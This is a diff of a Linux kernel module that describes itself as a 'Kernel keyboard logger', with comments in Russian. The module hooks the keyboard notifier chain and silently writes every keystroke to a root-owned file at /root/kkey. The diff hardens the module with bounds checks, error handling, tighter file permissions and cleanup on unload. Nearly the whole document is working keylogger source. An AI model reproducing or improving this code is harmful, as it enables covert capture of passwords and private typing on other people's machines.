@@ -1,23 +1,26 @@
-#include <linux/kernel.h>
 #include <linux/module.h>
+#include <linux/moduleparam.h>
+#include <linux/kernel.h>
+#include <linux/init.h>
+#include <linux/stat.h>
 #include <linux/input.h>
 #include <linux/keyboard.h>
-#include <linux/file.h>
 #include <linux/fs.h>
 #include <linux/workqueue.h>
+#include <linux/slab.h>
+#include <linux/errno.h>
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Lebedev Denis");
 MODULE_DESCRIPTION("Kernel keyboard logger");
-MODULE_VERSION("1.0");
+MODULE_VERSION("1.1");
 
-#define LOG_FILE_PATH       "/root/keyboard_log"
 #define MAX_BUFFER_SIZE     256
 #define TMP_BUFF_SIZE       16
+#define LOG_FILE_PATH     "/root/kkey"
 
 struct keyboard_logger {
     struct file *log_file;
-    
     struct notifier_block keyboard_notifier;
     struct work_struct writer_task;
     
@@ -28,15 +31,15 @@ struct keyboard_logger {
     size_t buffer_len;
     loff_t file_off;
 
-	char side_buffer[MAX_BUFFER_SIZE];
+    char side_buffer[MAX_BUFFER_SIZE];
     char back_buffer[MAX_BUFFER_SIZE];
 };
 
-static int keyboard_callback(struct notifier_block *kblock, unsigned long action, void *data);
 static void write_log_task(struct work_struct *work);
 static size_t keycode_to_us_string(int keycode, int shift, char *buffer, size_t buff_size);
 static void flush_buffer(struct keyboard_logger *klogger);
 
+// --- Карта раскладки (US) ---
 static const char *us_keymap[][2] = {
 	{"\0", "\0"}, {"_ESC_", "_ESC_"}, {"1", "!"}, {"2", "@"},
 	{"3", "#"}, {"4", "$"}, {"5", "%"}, {"6", "^"},
@@ -73,6 +76,9 @@ static const char *us_keymap[][2] = {
 	{"_PAUSE_", "_PAUSE_"},                                     
 };
 
+// --- Функция сброса буфера в задачу для записи ---
+// Мьютексы и атомики не используются, чтобы избежать блокировок в контексте ядра.
+// Иначе вся операционная система просто зависнет при попытке захвата мьютекса в обработчике прерываний.
 void flush_buffer(struct keyboard_logger *klogger)
 {
     char *tmp = klogger->keyboard_buffer;
@@ -86,11 +92,14 @@ void flush_buffer(struct keyboard_logger *klogger)
     klogger->buffer_offset = 0;
 }
 
+// --- Функция преобразования код-клавиши в строку ---
 size_t keycode_to_us_string(int keycode, int shift, char *buffer, size_t buff_size)
 {
+    const int keymap_size = sizeof(us_keymap) / sizeof(us_keymap[0]);
+    
     memset(buffer, 0x0, buff_size);
     
-	if(keycode > KEY_RESERVED && keycode <= KEY_PAUSE) 
+	if (keycode > 0 && keycode > KEY_RESERVED && keycode < keymap_size) 
 	{
 		const char *us_key = (shift == 1) ? us_keymap[keycode][1] : us_keymap[keycode][0];
 		snprintf(buffer, buff_size, "%s", us_key);
@@ -100,6 +109,7 @@ size_t keycode_to_us_string(int keycode, int shift, char *buffer, size_t buff_si
 	return 0;
 }
 
+// --- Callback-функция для перехвата событий клавиатуры ---
 int keyboard_callback(struct notifier_block *kblock, unsigned long action, void *data)
 {
     struct keyboard_logger *klogger;
@@ -110,17 +120,20 @@ int keyboard_callback(struct notifier_block *kblock, unsigned long action, void 
     klogger = container_of(kblock, struct keyboard_logger, keyboard_notifier);
     key_param = (struct keyboard_notifier_param *)data;
     
-	if(!(key_param->down) || (keystr_len = keycode_to_us_string(key_param->value, key_param->shift, tmp_buff, TMP_BUFF_SIZE)) < 1)
+    // Обрабатываем только нажатия клавиш
+	if (!(key_param->down) || (keystr_len = keycode_to_us_string(key_param->value, key_param->shift, tmp_buff, TMP_BUFF_SIZE)) < 1)
 		return NOTIFY_OK;
 	
-	if(tmp_buff[0] == '\n')
+	if (tmp_buff[0] == '\n')
 	{
-		klogger->keyboard_buffer[klogger->buffer_offset++] = '\n';
+		if (klogger->buffer_offset < MAX_BUFFER_SIZE - 1) {
+			klogger->keyboard_buffer[klogger->buffer_offset++] = '\n';
+		}
 		flush_buffer(klogger);
 		return NOTIFY_OK;
 	}
 	
-	if((klogger->buffer_offset + keystr_len) >= MAX_BUFFER_SIZE - 1)
+	if ((klogger->buffer_offset + keystr_len) >= MAX_BUFFER_SIZE - 1)
 		flush_buffer(klogger);
 	
 	strncpy(klogger->keyboard_buffer + klogger->buffer_offset, tmp_buff, keystr_len);
@@ -129,45 +142,70 @@ int keyboard_callback(struct notifier_block *kblock, unsigned long action, void 
     return NOTIFY_OK;
 }
 
+// --- Задача, выполняющая запись в файл ---
 void write_log_task(struct work_struct *work)
 {
     struct keyboard_logger *klogger;
+    ssize_t bytes_written;
+    
     klogger = container_of(work, struct keyboard_logger, writer_task);
-    kernel_write(klogger->log_file, klogger->write_buffer, klogger->buffer_len, &klogger->file_off);
+    
+    bytes_written = kernel_write(klogger->log_file, klogger->write_buffer, klogger->buffer_len, &klogger->file_off);
+    if (bytes_written < 0) {
+        pr_err("kkey: Failed to write to log file, error %zd\n", bytes_written);
+    }
 }
 
 static struct keyboard_logger *klogger;
 
+// --- Функция инициализации модуля ---
 static int __init k_key_logger_init(void)
 {
-    if((klogger = kzalloc(sizeof(struct keyboard_logger), GFP_KERNEL)) == NULL)
-    {
-        pr_err("Unable to alloc memory\n");
+    int err;
+
+    klogger = kzalloc(sizeof(struct keyboard_logger), GFP_KERNEL);
+    if (!klogger) {
+        pr_err("kkey: Unable to allocate memory\n");
         return -ENOMEM;
     }
     
-    if(IS_ERR(klogger->log_file = filp_open(LOG_FILE_PATH, O_CREAT | O_RDWR | O_APPEND, 0644)))
-    {
-		pr_info("Unable to create a log file\n");
-    	return -EINVAL;
+    klogger->log_file = filp_open(LOG_FILE_PATH, O_CREAT | O_WRONLY | O_APPEND, 0600);
+    if (IS_ERR(klogger->log_file)) {
+		pr_err("kkey: Unable to create or open log file: %s\n", LOG_FILE_PATH);
+        err = PTR_ERR(klogger->log_file);
+        kfree(klogger);
+    	return err;
 	}
 
 	klogger->keyboard_buffer = klogger->side_buffer;
 	klogger->write_buffer = klogger->back_buffer;
 	
 	klogger->keyboard_notifier.notifier_call = keyboard_callback;
-	register_keyboard_notifier(&klogger->keyboard_notifier);
+	err = register_keyboard_notifier(&klogger->keyboard_notifier);
+    if (err) {
+        pr_err("kkey: Failed to register keyboard notifier\n");
+        filp_close(klogger->log_file, NULL);
+        kfree(klogger);
+        return err;
+    }
 
-	INIT_WORK(&klogger->writer_task, &write_log_task);
+	INIT_WORK(&klogger->writer_task, write_log_task);
 
 	return 0;	
 }
 
+// --- Функция выгрузки модуля ---
 static void __exit k_key_logger_exit(void)
 {
 	unregister_keyboard_notifier(&klogger->keyboard_notifier);
-	fput(klogger->log_file);
-    kfree(klogger);
+    cancel_work_sync(&klogger->writer_task);
+    
+    if (klogger) {
+        if (!IS_ERR(klogger->log_file)) {
+            filp_close(klogger->log_file, NULL);
+        }
+        kfree(klogger);
+    }
 }
 
 module_init(k_key_logger_init);
